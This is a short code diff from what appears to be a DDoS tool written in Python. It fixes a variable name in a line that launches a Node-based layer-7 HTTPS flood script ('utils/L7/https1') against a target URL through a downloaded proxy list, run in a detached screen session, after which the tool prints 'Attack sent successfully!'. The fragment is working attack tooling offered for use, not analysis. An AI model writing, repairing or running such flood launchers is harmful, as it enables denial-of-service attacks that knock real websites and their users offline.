@@ -603,7 +603,7 @@ class Tool:
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {flood time} 64 1'], shell=True)
+					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
